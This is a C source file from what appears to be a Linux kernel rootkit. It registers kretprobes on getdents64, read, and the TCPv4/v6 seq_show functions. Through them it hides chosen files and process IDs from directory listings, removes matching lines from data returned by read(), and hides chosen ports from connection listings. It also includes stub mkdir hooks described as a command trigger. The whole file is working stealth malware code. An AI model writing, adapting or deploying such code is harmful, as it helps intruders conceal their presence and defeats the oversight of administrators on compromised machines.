// SPDX-License-Identifier: GPL-2.0
// core/filter.c - Kretprobes for hiding files, PIDs, content, ports.
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include "rootkit.h"

#ifndef SEQ_START_TOKEN
#define SEQ_START_TOKEN ((void *)1)
#endif

// Getdents64 filter (files and PIDs)
struct getdents_data {
	void __user *ubuf;
	int fd;
};

static bool should_hide_dirent(const char *name)
{
	if (rk_target_match(&rk_file_targets, name))
		return true;
	if (rk_target_match(&rk_pid_targets, name))
		return true;
	return false;
}

static int getdents_entry(struct kretprobe_instance *ri,
			   struct pt_regs *regs)
{
	struct getdents_data *data;

	data = (struct getdents_data *)ri->data;
	data->fd = (int)regs->di;
	data->ubuf = (void __user *)regs->si;
	return 0;
}

static int getdents_return(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct getdents_data *data;
	struct linux_dirent64 *d;
	long total, off, new_total;
	char *kbuf;

	data = (struct getdents_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	off = 0;
	new_total = total;
	while (off < new_total) {
		d = (struct linux_dirent64 *)(kbuf + off);
		if (should_hide_dirent(d->d_name)) {
			long remaining = new_total - off - d->d_reclen;

			if (remaining > 0)
				memmove(kbuf + off,
					kbuf + off + d->d_reclen,
					remaining);
			new_total -= d->d_reclen;
		} else {
			off += d->d_reclen;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

struct kretprobe rk_getdents_probe = {
	.handler        = getdents_return,
	.entry_handler  = getdents_entry,
	.data_size      = sizeof(struct getdents_data),
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_getdents64",
};

// Read filter (content lines)
struct read_data {
	void __user *ubuf;
	size_t count;
};

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;

	data = (struct read_data *)ri->data;
	data->ubuf = (void __user *)regs->si;
	data->count = (size_t)regs->dx;
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;
	long total, new_total;
	char *kbuf, *pos;

	data = (struct read_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	if (rk_content_targets.count == 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	pos = kbuf;
	new_total = total;

	while (pos < kbuf + new_total) {
		char *nl;
		int line_len;

		nl = memchr(pos, '\n', (kbuf + new_total) - pos);
		if (nl)
			line_len = nl - pos + 1;
		else
			line_len = (kbuf + new_total) - pos;

		if (rk_line_matches(&rk_content_targets, pos, line_len)) {
			long remaining;

			remaining = (kbuf + new_total) - (pos + line_len);
			if (remaining > 0)
				memmove(pos, pos + line_len, remaining);
			new_total -= line_len;
		} else {
			pos += line_len;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

struct kretprobe rk_read_probe = {
	.handler        = read_return,
	.entry_handler  = read_entry,
	.data_size      = sizeof(struct read_data),
	.maxactive      = 20,
	.kp.symbol_name = "ksys_read",
};

// TCP seq_show filter (ports)
struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

static int tcp_show_entry(struct kretprobe_instance *ri,
			   struct pt_regs *regs)
{
	struct tcp_show_data *data;

	data = (struct tcp_show_data *)ri->data;
	data->seq = (struct seq_file *)regs->di;
	data->saved_count = data->seq->count;
	data->sk = (struct sock *)regs->si;
	return 0;
}

static int tcp_show_return(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct tcp_show_data *data;
	struct inet_sock *inet;
	unsigned short sport;
	char port_str[8];

	data = (struct tcp_show_data *)ri->data;

	if (data->sk == SEQ_START_TOKEN)
		return 0;

	inet = inet_sk(data->sk);
	sport = ntohs(inet->inet_sport);
	snprintf(port_str, sizeof(port_str), "%u", sport);

	if (rk_target_match(&rk_port_targets, port_str))
		data->seq->count = data->saved_count;

	return 0;
}

struct kretprobe rk_tcp4_probe = {
	.handler        = tcp_show_return,
	.entry_handler  = tcp_show_entry,
	.data_size      = sizeof(struct tcp_show_data),
	.maxactive      = 20,
	.kp.symbol_name = "tcp4_seq_show",
};

struct kretprobe rk_tcp6_probe = {
	.handler        = tcp_show_return,
	.entry_handler  = tcp_show_entry,
	.data_size      = sizeof(struct tcp_show_data),
	.maxactive      = 20,
	.kp.symbol_name = "tcp6_seq_show",
};

// Mkdir probes (dual kretprobe for local command trigger)
static int mkdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

static int mkdir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_mkdir_probe = {
	.handler        = mkdir_return,
	.entry_handler  = mkdir_entry,
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdir",
};

struct kretprobe rk_mkdirat_probe = {
	.handler        = mkdir_return,
	.entry_handler  = mkdir_entry,
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdirat",
};
